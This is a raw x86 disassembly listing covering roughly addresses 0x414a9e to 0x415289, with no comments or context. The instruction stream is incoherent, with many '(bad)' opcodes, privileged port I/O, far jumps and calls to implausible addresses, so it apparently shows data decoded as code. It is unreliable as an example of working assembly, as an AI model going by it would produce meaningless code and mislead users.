  414a9e:	jp     0x414a9a
  414aa0:	in     eax,dx
  414aa1:	mov    eax,ds:0x8bb9166
  414aa6:	fisttp QWORD PTR [ebp-0x1b]
  414aa9:	les    edi,FWORD PTR [esi+0x37]
  414aac:	retf   
  414aad:	dec    esi
  414aae:	mov    WORD PTR [esi+ebp*1],ss
  414ab1:	xlat   BYTE PTR ds:[ebx]
  414ab2:	cmc    
  414ab3:	pop    edi
  414ab4:	ss push es
  414ab6:	out    0xac,eax
  414ab8:	xor    eax,0xdc691508
  414abd:	loope  0x414a9c
  414abf:	cmp    DWORD PTR [ebp-0x2c30f718],esi
  414ac5:	adc    bh,BYTE PTR ds:0xfcd6a325
  414acb:	and    eax,0x2d4959fd
  414ad0:	dec    ebp
  414ad1:	push   ss
  414ad2:	cmp    eax,0x52d0eadf
  414ad7:	out    dx,eax
  414ad8:	mov    ds:0xa4fcb9f3,eax
  414add:	je     0x414b09
  414adf:	jge    0x414a82
  414ae1:	xchg   esp,eax
  414ae2:	add    eax,0x88dfc1a7
  414ae7:	add    BYTE PTR [ebp-0x38],dl
  414aea:	adc    dl,dh
  414aec:	call   0x3a843156
  414af1:	mov    al,ds:0x52b32672
  414af6:	fnsave [ecx+0x3664f835]
  414afc:	scas   al,BYTE PTR es:[edi]
  414afd:	(bad)  
  414afe:	pop    ds
  414aff:	cld    
  414b00:	cwde   
  414b01:	mov    ecx,0x835b5890
  414b06:	pop    esp
  414b07:	cmp    cl,bl
  414b09:	ficomp WORD PTR [ebp-0x6527e38c]
  414b0f:	ins    BYTE PTR es:[edi],dx
  414b10:	push   eax
  414b11:	jle    0x414b5f
  414b13:	(bad)  
  414b14:	loopne 0x414b2c
  414b16:	jecxz  0x414b14
  414b18:	sahf   
  414b19:	imul   esi,esi,0x7aa106f5
  414b1f:	repz (bad) 
  414b21:	pop    ebx
  414b22:	(bad)  
  414b23:	fwait
  414b24:	jp     0x414ac7
  414b26:	sub    al,0x5e
  414b28:	cld    
  414b29:	mov    dl,0x85
  414b2b:	lahf   
  414b2c:	adc    WORD PTR [edi-0x6b149c76],bp
  414b33:	retf   
  414b34:	mov    bl,0x37
  414b36:	xor    DWORD PTR [edi+0x76],esi
  414b39:	dec    esp
  414b3a:	add    BYTE PTR [eax],al
  414b3c:	cmp    BYTE PTR [ebp-0x446c043b],0xf5
  414b43:	push   es
  414b44:	sbb    al,0x3d
  414b46:	mov    ah,BYTE PTR [ebx-0x41]
  414b49:	push   0x62
  414b4b:	aas    
  414b4c:	sbb    dh,BYTE PTR [ebx]
  414b4e:	jecxz  0x414b86
  414b50:	mov    ah,0xf9
  414b52:	push   0xcee6043f
  414b57:	mov    dl,0xd5
  414b59:	jl     0x414b3a
  414b5b:	(bad)  
  414b5c:	pop    ss
  414b5d:	push   ds
  414b5e:	sbb    edi,esp
  414b60:	push   esi
  414b61:	hlt    
  414b62:	cmp    al,0xd6
  414b64:	inc    esi
  414b65:	data16 ins BYTE PTR es:[edi],dx
  414b67:	sbb    eax,0x1fc60d45
  414b6c:	fidiv  DWORD PTR [esp+eax*2+0x46]
  414b70:	jne    0x414b7d
  414b72:	and    DWORD PTR [ebx],esi
  414b74:	jno    0x414b83
  414b76:	loope  0x414bde
  414b78:	sti    
  414b79:	add    cl,BYTE PTR [eax+0x2a4562cc]
  414b7f:	sub    al,BYTE PTR [ebx+0x1633dfc7]
  414b85:	out    dx,eax
  414b86:	mov    edx,0xf6f796e
  414b8b:	pop    ss
  414b8c:	mov    WORD PTR ds:0x97768b27,fs
  414b92:	scas   al,BYTE PTR es:[edi]
  414b93:	test   BYTE PTR [ebx-0xf2b2a4c],0x46
  414b9a:	repz sbb al,0x75
  414b9d:	sbb    eax,0xc8254c9e
  414ba3:	xor    al,0x2d
  414ba5:	add    BYTE PTR [esi-0x76a85074],bh
  414bab:	cmp    cl,BYTE PTR [esi-0x34c8046]
  414bb1:	clc    
  414bb2:	jns    0x414bb8
  414bb4:	jge    0x414bf9
  414bb6:	sub    eax,esp
  414bb8:	jg     0x414bd7
  414bba:	dec    ebx
  414bbb:	cmp    dl,BYTE PTR ds:0x8c2e6709
  414bc1:	push   ebx
  414bc2:	aas    
  414bc3:	sub    esp,DWORD PTR [ecx]
  414bc5:	mov    cl,0xca
  414bc7:	mov    al,0x7e
  414bc9:	cli    
  414bca:	std    
  414bcb:	xchg   BYTE PTR ds:0xe45b9f48,al
  414bd1:	icebp  
  414bd2:	push   esp
  414bd3:	pop    es
  414bd4:	cmp    dh,cl
  414bd6:	cld    
  414bd7:	scas   eax,DWORD PTR es:[edi]
  414bd8:	call   0x2f4f2ec5
  414bdd:	and    BYTE PTR [esi],cl
  414bdf:	loopne 0x414c20
  414be1:	adc    ebx,DWORD PTR [ecx-0x59]
  414be4:	(bad)  
  414be5:	cmp    edi,DWORD PTR [edx-0x1b]
  414be8:	outs   dx,BYTE PTR ds:[esi]
  414be9:	inc    esi
  414bea:	adc    ebx,DWORD PTR [eax]
  414bec:	pushf  
  414bed:	sub    BYTE PTR [edx],bl
  414bef:	dec    esp
  414bf0:	icebp  
  414bf1:	(bad)  
  414bf3:	push   ebx
  414bf4:	or     al,0x91
  414bf6:	or     BYTE PTR [edi+0x3a20a9dc],al
  414bfc:	bound  esp,QWORD PTR [edi+0x25]
  414bff:	and    DWORD PTR [esi+0x71945e66],0x9df8ee77
  414c09:	mov    DWORD PTR [ebx],esi
  414c0b:	pushf  
  414c0c:	bound  esi,QWORD PTR [ecx-0x78]
  414c0f:	push   cs
  414c10:	cmp    DWORD PTR [edi+0x5f],ecx
  414c13:	fld    QWORD PTR [edi-0x7a]
  414c16:	int    0x91
  414c18:	mov    ecx,0x737e7442
  414c1d:	sub    bl,BYTE PTR [ecx]
  414c1f:	(bad)  
  414c21:	or     ebx,ebp
  414c23:	test   eax,0xe3d7dc47
  414c28:	cld    
  414c29:	xchg   esp,eax
  414c2a:	pop    ecx
  414c2b:	sti    
  414c2c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414c2d:	clc    
  414c2e:	sbb    DWORD PTR [ecx-0x1d2e972e],ebp
  414c34:	add    eax,0xf24787b1
  414c39:	ffreep st(0)
  414c3b:	cmc    
  414c3c:	inc    esi
  414c3d:	aad    0xfe
  414c3f:	lock jae 0x414c97
  414c42:	xchg   ecx,eax
  414c43:	iret   
  414c44:	jecxz  0x414c90
  414c46:	or     DWORD PTR [ecx+0x6950d194],esp
  414c4c:	mov    ebx,0x4f48cd20
  414c51:	adc    DWORD PTR [eax+esi*2],0xffffff82
  414c55:	popw   es
  414c57:	nop
  414c58:	in     eax,dx
  414c59:	inc    ebp
  414c5a:	push   ebx
  414c5b:	mov    dh,0x14
  414c5d:	cdq    
  414c5e:	dec    ebx
  414c5f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414c60:	pop    ss
  414c61:	sub    DWORD PTR [ebx+0x68],esi
  414c64:	xor    al,0x46
  414c66:	retf   0x8c6a
  414c69:	hlt    
  414c6a:	loopne 0x414c3f
  414c6c:	jmp    0xde4b73ff
  414c71:	mov    bh,0x50
  414c73:	dec    ebx
  414c74:	sub    al,BYTE PTR [si+0x2c51]
  414c79:	sub    bl,BYTE PTR [esi+0xe]
  414c7c:	mov    ecx,0xeddb4d16
  414c81:	(bad)  
  414c83:	mov    WORD PTR [eax+0x59b5a6c2],gs
  414c89:	aaa    
  414c8a:	rol    edx,0xbd
  414c8d:	or     eax,0x37b93e00
  414c92:	cmp    al,BYTE PTR [ebp-0x79fe98f3]
  414c98:	clc    
  414c99:	or     ebx,eax
  414c9b:	scas   eax,DWORD PTR es:[edi]
  414c9c:	jae    0x414c25
  414c9e:	jns    0x414cb3
  414ca0:	and    ah,BYTE PTR [eax]
  414ca2:	mov    dh,0x6
  414ca4:	or     BYTE PTR [edi-0x636c129e],ch
  414caa:	repz test eax,0x561d500b
  414cb0:	pusha  
  414cb1:	mov    eax,0xd4758e60
  414cb6:	inc    edx
  414cb7:	pop    ebx
  414cb8:	mov    al,ds:0xf87942bf
  414cbd:	xor    edx,ebx
  414cbf:	mov    BYTE PTR [edi],cl
  414cc1:	adc    BYTE PTR [ebx+0x39],ch
  414cc4:	daa    
  414cc5:	sub    al,0x57
  414cc7:	sbb    edi,esi
  414cc9:	jmp    0xb56a:0xd4e98440
  414cd0:	or     esp,DWORD PTR [eax+0x2d1e9075]
  414cd6:	test   DWORD PTR [ebx+0x16],0xf7db1a57
  414cdd:	std    
  414cde:	inc    ecx
  414cdf:	pop    ds
  414ce0:	push   edx
  414ce1:	sub    bl,ch
  414ce3:	xor    eax,0xa238e6e6
  414ce8:	mov    BYTE PTR ds:0xee068771,cl
  414cee:	xchg   esp,eax
  414cef:	push   esp
  414cf0:	inc    ebp
  414cf1:	je     0x414d00
  414cf3:	test   BYTE PTR [edi+0x36],0x94
  414cf7:	cld    
  414cf8:	mov    ds:0xd81e6a46,al
  414cfd:	inc    edi
  414cfe:	jno    0x414d34
  414d00:	out    dx,al
  414d01:	jne    0x414d69
  414d03:	push   ebp
  414d04:	and    eax,0x686dce68
  414d09:	fld    DWORD PTR [edi-0x7]
  414d0c:	add    ebx,esp
  414d0e:	mov    esp,0xa4c6997e
  414d13:	into   
  414d14:	cmp    eax,0x24481ad2
  414d19:	mov    eax,DWORD PTR [ebx+0x53]
  414d1c:	xor    DWORD PTR [esi+0x610ddf96],ebx
  414d22:	dec    edx
  414d23:	outs   dx,BYTE PTR ds:[esi]
  414d24:	sti    
  414d25:	xor    edx,DWORD PTR ds:0x2a6770f4
  414d2b:	shl    BYTE PTR [eax+0x1b],0x65
  414d2f:	sti    
  414d30:	mov    al,ds:0x3c204450
  414d35:	out    dx,al
  414d36:	sub    dh,bh
  414d38:	jle    0x414cba
  414d3a:	adc    al,0x9b
  414d3c:	sbb    eax,0x837a51a3
  414d41:	sub    BYTE PTR [edx],0x9d
  414d44:	mov    ecx,0xe588e8b8
  414d49:	dec    edx
  414d4a:	xchg   edx,edi
  414d4c:	jmp    0xadee4f37
  414d51:	call   0x508462e2
  414d56:	push   edi
  414d57:	getsec 
  414d59:	out    dx,eax
  414d5a:	jp     0x414ce5
  414d5c:	retf   
  414d5d:	ss dec esi
  414d5f:	add    DWORD PTR [ebp-0x29f00436],0xcbecf596
  414d69:	scas   al,BYTE PTR es:[edi]
  414d6a:	sar    ebx,0x1c
  414d6d:	mov    ebp,0xabe2e033
  414d72:	add    ah,BYTE PTR [esi]
  414d74:	mov    ecx,ebp
  414d76:	sahf   
  414d77:	dec    ebx
  414d78:	arpl   bx,cx
  414d7a:	mov    WORD PTR [eax+0x3e],?
  414d7d:	scas   eax,DWORD PTR es:[edi]
  414d7e:	pop    ebp
  414d7f:	pop    ds
  414d80:	pop    esi
  414d81:	adc    edx,eax
  414d83:	rcl    DWORD PTR [edi+0x683bad8d],1
  414d89:	or     dl,BYTE PTR [edi]
  414d8b:	test   al,0xc6
  414d8d:	(bad)  
  414d8e:	popf   
  414d8f:	sub    al,0x61
  414d91:	xor    cl,BYTE PTR [ecx+0x40]
  414d94:	xor    dh,BYTE PTR [eax+0x64d76d23]
  414d9a:	dec    eax
  414d9b:	lahf   
  414d9c:	adc    DWORD PTR [eax-0x74],esp
  414d9f:	bound  esi,QWORD PTR [eax-0x18a8ba7b]
  414da5:	push   ebp
  414da6:	xor    al,0xe5
  414da8:	push   0xa3a8ff1b
  414dad:	and    cl,BYTE PTR [esi+0x44f0edda]
  414db3:	sbb    DWORD PTR [edx+0x5f],edi
  414db6:	(bad)  
  414db7:	jo     0x414df7
  414db9:	mov    ecx,0x83392ce4
  414dbe:	sbb    bl,BYTE PTR [edi+eiz*4]
  414dc1:	scas   eax,DWORD PTR es:[edi]
  414dc2:	stc    
  414dc3:	sar    BYTE PTR [edx+0x5c55b2ed],1
  414dc9:	dec    esp
  414dca:	inc    DWORD PTR [eax+0x1a]
  414dcd:	mov    bl,0xc2
  414dcf:	dec    eax
  414dd0:	inc    ecx
  414dd1:	sub    esp,ebp
  414dd3:	test   BYTE PTR [ebx],bh
  414dd5:	mov    ebp,0x4a174af1
  414dda:	repnz or eax,0xbca57df4
  414de0:	push   es
  414de1:	pushf  
  414de2:	outs   dx,BYTE PTR ds:[esi]
  414de3:	inc    ebp
  414de4:	mov    ecx,0x70ec7b40
  414de9:	popf   
  414dea:	adc    bl,BYTE PTR [ecx-0x454b0475]
  414df0:	in     eax,0xb4
  414df2:	(bad)  
  414df3:	ret    
  414df4:	int    0xe7
  414df6:	pop    esp
  414df7:	mov    ds:0xe021e7f6,al
  414dfc:	mov    ecx,0x54c0ccf8
  414e01:	inc    ebx
  414e02:	sahf   
  414e03:	sbb    BYTE PTR [ebp-0x1437ebc0],dh
  414e09:	bound  edx,QWORD PTR [esi-0x18ac5075]
  414e0f:	fidiv  DWORD PTR [edx-0x4]
  414e12:	loope  0x414e4d
  414e14:	xchg   edi,eax
  414e15:	xchg   edi,eax
  414e16:	jg     0x414e43
  414e18:	cwde   
  414e19:	inc    eax
  414e1a:	cdq    
  414e1b:	jge    0x414e98
  414e1d:	xor    al,0xae
  414e1f:	mov    esi,0x62fb2b05
  414e24:	adc    DWORD PTR [ebp+0x77],ebx
  414e27:	sahf   
  414e28:	jmp    0xa4e3:0xa87e926
  414e2f:	add    eax,ecx
  414e31:	or     esp,edi
  414e33:	jmp    0x9783978
  414e38:	and    al,0x9a
  414e3a:	mov    edx,DWORD PTR [ecx]
  414e3c:	push   ebx
  414e3d:	push   0xc34226f7
  414e42:	es cdq 
  414e44:	imul   edi,DWORD PTR [edi],0xffffffda
  414e47:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414e48:	(bad)  
  414e49:	in     al,dx
  414e4a:	or     DWORD PTR [edi+0x5a],eax
  414e4d:	xchg   ebx,eax
  414e4e:	hlt    
  414e4f:	retf   
  414e50:	adc    eax,0x5b93109
  414e55:	enter  0x4f0,0xf1
  414e59:	sbb    al,0x42
  414e5b:	jp     0x414e68
  414e5d:	cs mov dl,0xbe
  414e60:	and    esi,DWORD PTR [ebx-0x4]
  414e63:	call   0x301b0454
  414e68:	data16 fist WORD PTR ds:0xa9d4e101
  414e6f:	pushf  
  414e70:	or     dh,bl
  414e72:	xchg   esp,eax
  414e73:	add    eax,0xe3e6a596
  414e78:	daa    
  414e79:	cmp    al,0x3a
  414e7b:	ret    
  414e7c:	add    DWORD PTR [eax+0x2cc48fcc],ebp
  414e82:	loope  0x414ef1
  414e84:	push   ss
  414e85:	pushf  
  414e86:	ds test bh,dh
  414e89:	mov    ds:0xd642544,eax
  414e8e:	and    ecx,DWORD PTR [ecx]
  414e90:	dec    eax
  414e91:	mov    cl,0x8e
  414e93:	popa   
  414e94:	stos   DWORD PTR es:[edi],eax
  414e95:	cmc    
  414e96:	sub    al,0x89
  414e98:	pushf  
  414e99:	push   es
  414e9a:	add    ecx,edx
  414e9c:	lahf   
  414e9d:	cld    
  414e9e:	mov    ebp,ebx
  414ea0:	cdq    
  414ea1:	loopne 0x414eff
  414ea3:	rcr    BYTE PTR ds:0xbeb345c1,0x47
  414eaa:	addr16 mov ah,0xe9
  414ead:	jl     0x414ef2
  414eaf:	dec    ecx
  414eb0:	sub    BYTE PTR gs:[ebp-0x76152195],cl
  414eb7:	inc    ebx
  414eb8:	mov    ds:0x29cf4993,al
  414ebd:	imul   ebx,DWORD PTR [edx+0x630240f9],0xd09f07ed
  414ec7:	add    al,0x3
  414ec9:	mov    eax,0x77fadf51
  414ece:	faddp  st(6),st
  414ed0:	jbe    0x414e6b
  414ed2:	mov    DWORD PTR [esi-0x72],ecx
  414ed5:	arpl   WORD PTR [ebx],ax
  414ed7:	mov    cl,0xa1
  414ed9:	mov    ebx,0x19f74d22
  414ede:	(bad)  
  414edf:	aaa    
  414ee0:	mov    eax,ds:0x42a55c41
  414ee5:	xor    ah,bl
  414ee7:	sti    
  414ee8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414ee9:	push   es
  414eea:	dec    ebp
  414eeb:	dec    edx
  414eec:	xchg   edx,eax
  414eed:	das    
  414eee:	mov    cl,0x5a
  414ef0:	enter  0x9e6c,0xf0
  414ef4:	mov    edx,0x859770a4
  414ef9:	add    DWORD PTR ds:0xc2d2fcc9,esp
  414eff:	hlt    
  414f00:	(bad)  
  414f01:	cwde   
  414f02:	add    al,0x21
  414f04:	jns    0x414f45
  414f06:	test   al,dl
  414f08:	add    ebp,eax
  414f0a:	inc    edx
  414f0b:	imul   ebp,DWORD PTR [ebx-0x7d07fda1],0xffffffe2
  414f12:	xor    ecx,edi
  414f14:	imul   esi,ebx,0xf27812ad
  414f1a:	jmp    0x99bdded3
  414f1f:	std    
  414f20:	sahf   
  414f21:	ret    
  414f22:	xchg   DWORD PTR [eax+ebp*8],eax
  414f25:	out    0x32,eax
  414f27:	jo     0x414ee2
  414f29:	pushf  
  414f2a:	sub    dl,BYTE PTR [ecx+ebx*8+0x74]
  414f2e:	push   edi
  414f2f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414f30:	les    edi,FWORD PTR [esi+ebx*8-0x6fd8c48c]
  414f37:	clc    
  414f38:	lods   eax,DWORD PTR ds:[esi]
  414f39:	inc    eax
  414f3a:	es repz iret 
  414f3d:	mov    ds:0x98c2d33d,eax
  414f42:	inc    edx
  414f43:	(bad)  
  414f44:	rol    BYTE PTR [edx],1
  414f46:	sbb    BYTE PTR [ebx-0x2d],ah
  414f49:	enter  0x956a,0x66
  414f4d:	sbb    bl,BYTE PTR [bx+di-0x3bc1]
  414f52:	ss pop eax
  414f54:	rol    DWORD PTR [edx-0x778c007e],0xa2
  414f5b:	mov    DWORD PTR [eax-0x13],0x308e1785
  414f62:	sub    DWORD PTR [eax],edx
  414f64:	cwde   
  414f65:	imul   ebx,DWORD PTR [edx],0xffffff8f
  414f68:	mov    ebx,0x87ec245d
  414f6d:	inc    ecx
  414f6e:	fwait
  414f6f:	jle    0x414f39
  414f71:	(bad)  
  414f72:	and    al,0x54
  414f74:	push   ss
  414f75:	inc    eax
  414f76:	cs inc esp
  414f78:	fs lahf 
  414f7a:	fstp   QWORD PTR [eax-0x2aa8975c]
  414f80:	ret    
  414f81:	pop    es
  414f82:	sbb    bh,bh
  414f84:	xchg   edx,eax
  414f85:	mov    WORD PTR [edi],cs
  414f87:	fwait
  414f88:	jmp    0x36fe4890
  414f8d:	and    ecx,esp
  414f8f:	test   DWORD PTR [edx],edx
  414f91:	test   DWORD PTR [ebx+0x6e],esi
  414f94:	fld    DWORD PTR [esi]
  414f96:	sub    BYTE PTR [esi+0x71ef1abe],ah
  414f9c:	test   DWORD PTR [edx+0x3fbf4f96],ebx
  414fa2:	pop    eax
  414fa3:	gs jecxz 0x414ff6
  414fa6:	push   es
  414fa7:	jle    0x414fb2
  414fa9:	idiv   DWORD PTR [edi]
  414fab:	pop    esi
  414fac:	jnp    0x414f8d
  414fae:	or     DWORD PTR [esp+ebp*2-0x49],edi
  414fb2:	sbb    dl,cl
  414fb4:	inc    esp
  414fb5:	mov    bl,0x1
  414fb7:	pop    edx
  414fb8:	hlt    
  414fb9:	outs   dx,DWORD PTR ds:[esi]
  414fba:	xchg   edi,esp
  414fbc:	or     edi,DWORD PTR [esi-0x5ca486d0]
  414fc2:	xor    al,0x8f
  414fc4:	add    edx,DWORD PTR [eax+ebp*8+0x6355329f]
  414fcb:	mov    ch,0x2f
  414fcd:	fxtract 
  414fcf:	clc    
  414fd0:	jb     0x414fb8
  414fd2:	push   cs
  414fd3:	js     0x414f75
  414fd5:	call   0xaf09075d
  414fda:	sub    bh,BYTE PTR [edi]
  414fdc:	inc    edx
  414fdd:	(bad)  
  414fde:	out    dx,eax
  414fdf:	bound  esp,QWORD PTR [eax-0x64b442e0]
  414fe5:	retf   0xf7ea
  414fe8:	xchg   edi,eax
  414fe9:	in     eax,0x5f
  414feb:	outs   dx,BYTE PTR ds:[esi]
  414fec:	arpl   WORD PTR [ebx+0x595fd495],si
  414ff2:	ds mov dl,0x3d
  414ff5:	dec    ebx
  414ff6:	jmp    0x415048
  414ff8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414ff9:	push   ebx
  414ffa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414ffb:	xor    esp,DWORD PTR [eax]
  414ffd:	or     al,0x78
  414fff:	dec    edi
  415000:	cmp    dl,BYTE PTR [edi-0x43]
  415003:	cwde   
  415004:	mov    al,0x67
  415006:	hlt    
  415007:	retf   
  415008:	add    ecx,edi
  41500a:	rcr    bh,0xbc
  41500d:	pop    ebp
  41500e:	addr16 daa 
  415010:	xchg   ebp,eax
  415011:	lea    esi,[ebx]
  415013:	ds (bad) 
  415015:	(bad)  
  415017:	inc    ebx
  415018:	adc    DWORD PTR ds:0xd1731ee,edi
  41501e:	leave  
  41501f:	pop    esi
  415020:	add    ch,dl
  415022:	aas    
  415023:	xor    eax,0xc207f202
  415028:	pop    esp
  415029:	dec    ebp
  41502a:	mov    esi,0x773ee911
  41502f:	mov    edx,0x232c6919
  415034:	jae    0x415048
  415036:	mov    BYTE PTR [ebx+0x5534ee75],dl
  41503c:	xor    dh,BYTE PTR [esi+eax*8+0x3879aba9]
  415043:	(bad)  
  415045:	cmp    dl,bh
  415047:	ret    0xdb9c
  41504a:	fnstcw WORD PTR [edx+0x2]
  41504d:	test   BYTE PTR [ebp-0x17],0x48
  415051:	pop    ebx
  415052:	mov    ch,dh
  415054:	sub    al,0xfc
  415056:	add    cl,BYTE PTR [ecx-0x5db89bbe]
  41505c:	sbb    al,0x23
  41505e:	jb     0x415005
  415060:	xor    ecx,DWORD PTR [ecx]
  415062:	sbb    eax,0x7fd89b42
  415067:	outs   dx,DWORD PTR ds:[esi]
  415068:	scas   al,BYTE PTR es:[edi]
  415069:	dec    edi
  41506a:	jbe    0x41506f
  41506c:	in     eax,dx
  41506d:	inc    esp
  41506e:	shl    BYTE PTR [esi+ecx*8+0x3e],1
  415072:	xlat   BYTE PTR ds:[ebx]
  415073:	adc    DWORD PTR [ecx-0x11],edx
  415076:	cmp    bl,bl
  415078:	pop    eax
  415079:	(bad)  
  41507a:	enter  0x6821,0x42
  41507e:	and    DWORD PTR [edx+0x4e357e1],ebp
  415084:	jae    0x4150d4
  415086:	dec    ecx
  415087:	(bad)  
  415088:	xchg   ebx,eax
  415089:	sbb    al,bl
  41508b:	cs xchg ecx,eax
  41508d:	mov    cl,0x4b
  41508f:	sub    DWORD PTR [ecx+0x1],edx
  415092:	cmp    bl,BYTE PTR [ecx-0x38f6c754]
  415098:	scas   eax,DWORD PTR es:[edi]
  415099:	sar    dh,cl
  41509b:	mov    cl,0x7e
  41509d:	mov    edi,0xfdff5d17
  4150a2:	adc    ah,0xe6
  4150a5:	ss cwde 
  4150a7:	(bad)  
  4150a8:	and    bh,dh
  4150aa:	pop    ebp
  4150ab:	push   esp
  4150ac:	jle    0x4150d5
  4150ae:	push   edi
  4150af:	pop    esp
  4150b0:	in     al,dx
  4150b1:	jecxz  0x4150f7
  4150b3:	mov    ebx,0xbf971ef
  4150b8:	loopne 0x4150f1
  4150ba:	fiadd  WORD PTR [ebx+0xe3a6219]
  4150c0:	jae    0x41504e
  4150c2:	jbe    0x415113
  4150c4:	sub    al,0x12
  4150c6:	ja     0x41513c
  4150c8:	push   eax
  4150c9:	and    DWORD PTR [edi],eax
  4150cb:	adc    ebp,edx
  4150cd:	leave  
  4150ce:	push   ecx
  4150cf:	jge    0x415071
  4150d1:	ins    BYTE PTR es:[edi],dx
  4150d2:	xchg   esi,eax
  4150d3:	stos   BYTE PTR es:[edi],al
  4150d4:	inc    esp
  4150d5:	cmp    DWORD PTR [edx-0x27a40463],edx
  4150db:	pop    edx
  4150dc:	pop    esp
  4150dd:	popa   
  4150de:	jnp    0x41515d
  4150e0:	inc    edi
  4150e1:	fimul  DWORD PTR [eax-0x2c18125a]
  4150e7:	cmc    
  4150e8:	or     ebx,ecx
  4150ea:	(bad)  
  4150eb:	outs   dx,BYTE PTR ds:[esi]
  4150ec:	pmaddwd mm7,mm4
  4150ef:	mov    bl,0x51
  4150f1:	xor    dh,BYTE PTR [esi+0x4a6f6dbd]
  4150f7:	into   
  4150f8:	jmp    0x3b71:0x82442566
  4150ff:	shr    BYTE PTR [edi+0x3f],cl
  415102:	sub    cl,0x6b
  415105:	out    0xff,eax
  415107:	mov    al,0xd6
  415109:	dec    ecx
  41510a:	cmc    
  41510b:	sbb    BYTE PTR [ebx+0x7a870109],0x5c
  415112:	and    bl,BYTE PTR ds:0x9da9b589
  415118:	mov    bh,0xed
  41511a:	add    DWORD PTR [ebx],esp
  41511c:	pop    edx
  41511d:	jb     0x41515d
  41511f:	inc    ecx
  415120:	mov    edi,0xe30a2229
  415125:	loope  0x415193
  415127:	or     esi,DWORD PTR [ebx-0xf]
  41512a:	mov    eax,ds:0x1e7e020
  41512f:	int    0x5
  415131:	iret   
  415132:	xchg   DWORD PTR [esi+edi*2-0x4b],ecx
  415136:	fprem  
  415138:	out    dx,eax
  415139:	idiv   DWORD PTR [edx-0x233fe6f4]
  41513f:	and    BYTE PTR [esi+0x5d7a5c],al
  415145:	or     ecx,ebx
  415147:	mov    eax,ds:0x1278da6f
  41514c:	jge    0x41515c
  41514e:	push   edx
  41514f:	(bad)  
  415150:	lods   al,BYTE PTR ds:[esi]
  415151:	aad    0x2a
  415153:	(bad)  
  415155:	rol    DWORD PTR [edx],1
  415157:	sub    eax,0x8959ffbb
  41515c:	sahf   
  41515d:	clc    
  41515e:	fimul  DWORD PTR [ebx+0x2b5d0b0a]
  415164:	(bad)  
  415165:	sbb    DWORD PTR [esi+0x2ceb4079],esp
  41516b:	jns    0x41512b
  41516d:	sub    edx,DWORD PTR [ebx]
  41516f:	push   edi
  415170:	push   eax
  415171:	push   es
  415172:	add    eax,0x33e2f4a2
  415177:	dec    ebx
  415178:	jmp    0xcbc8:0xd9387c6d
  41517f:	rcr    BYTE PTR [edx+esi*1+0x714119d2],0x20
  415187:	xchg   ecx,eax
  415188:	push   esp
  415189:	pop    ebp
  41518a:	push   esi
  41518b:	mov    BYTE PTR [edi],ch
  41518d:	xlat   BYTE PTR ds:[ebx]
  41518e:	cld    
  41518f:	ja     0x4151db
  415191:	fs pop edi
  415193:	and    eax,DWORD PTR [ebp+0x3acab59c]
  415199:	add    ch,BYTE PTR [ebp-0x3]
  41519c:	retf   0x474b
  41519f:	sbb    esp,esi
  4151a1:	inc    ecx
  4151a2:	rcl    DWORD PTR [ecx],cl
  4151a4:	push   ds
  4151a5:	sub    al,0xbd
  4151a7:	pop    es
  4151a8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4151a9:	and    eax,0xa0aa39b8
  4151ae:	and    al,0xab
  4151b0:	fmul   QWORD PTR [ebx]
  4151b2:	mov    ecx,DWORD PTR [edi-0x731d7faa]
  4151b8:	jp     0x41516e
  4151ba:	xchg   BYTE PTR [eax],bl
  4151bc:	sbb    BYTE PTR [ebp+0x14],dl
  4151bf:	aad    0xb8
  4151c1:	icebp  
  4151c2:	jl     0x415207
  4151c4:	icebp  
  4151c5:	xchg   edi,eax
  4151c6:	mov    bh,0x10
  4151c8:	xor    BYTE PTR [ecx],al
  4151ca:	mov    ebx,DWORD PTR [ecx+0xc367778]
  4151d0:	sahf   
  4151d1:	pop    es
  4151d2:	push   eax
  4151d3:	enter  0x924c,0xd5
  4151d7:	mov    ebp,0x7466fba7
  4151dc:	fwait
  4151dd:	out    0x10,eax
  4151df:	cli    
  4151e0:	adc    ah,cl
  4151e2:	dec    eax
  4151e3:	fist   WORD PTR [ecx]
  4151e5:	push   eax
  4151e6:	cmp    al,0xfc
  4151e8:	fstp   st(2)
  4151ea:	or     eax,0x30a73b90
  4151ef:	and    DWORD PTR [esi],esi
  4151f1:	xor    dh,BYTE PTR [edx-0x20b01e7]
  4151f7:	(bad)  
  4151f8:	aad    0x91
  4151fa:	aaa    
  4151fb:	call   0xe556:0x76ee6842
  415202:	aas    
  415203:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415204:	mov    dl,0x4
  415206:	jl     0x4151ac
  415208:	and    al,0x90
  41520a:	pusha  
  41520b:	ret    
  41520c:	inc    esp
  41520d:	cmp    al,0xe7
  41520f:	in     al,dx
  415210:	push   edi
  415211:	jae    0x415286
  415213:	mov    ds:0x45f58c0c,eax
  415218:	push   0x3c58d0b3
  41521d:	push   ds
  41521e:	and    eax,0x1238552e
  415223:	cdq    
  415224:	fnstenv [esi+esi*2+0x6a]
  415228:	rol    DWORD PTR [edi-0x3c],cl
  41522b:	mov    al,ds:0x6e3d2775
  415230:	(bad)  
  415231:	or     eax,0x1bd71a76
  415236:	sbb    BYTE PTR [edx+0x34],ch
  415239:	mov    edi,0x68c2480a
  41523e:	mov    al,ds:0xe882bf38
  415243:	dec    edx
  415244:	sub    eax,0xd35aa732
  415249:	mov    ah,0x8c
  41524b:	fidiv  WORD PTR [eax-0x3c]
  41524e:	add    al,0x1d
  415250:	dec    edi
  415251:	inc    edx
  415252:	sbb    BYTE PTR [ecx-0x3dc0cd9b],0x50
  415259:	mov    eax,0xe497cfce
  41525e:	mov    eax,0x50c75357
  415263:	jmp    0xcbe5:0x84cf114d
  41526a:	xchg   edi,eax
  41526b:	neg    DWORD PTR [esi]
  41526d:	jmp    0x339b:0xf27d3b96
  415274:	(bad)  
  415275:	(bad)  [ebx]
  415277:	pop    ecx
  415278:	(bad)  
  415279:	in     eax,0x7
  41527b:	or     ch,dl
  41527d:	pop    ebx
  41527e:	and    DWORD PTR [ebp-0x1b],esi
  415281:	std    
  415282:	mov    ebp,0xe5208017
  415287:	xchg   cl,bl
  415289:	push   esp
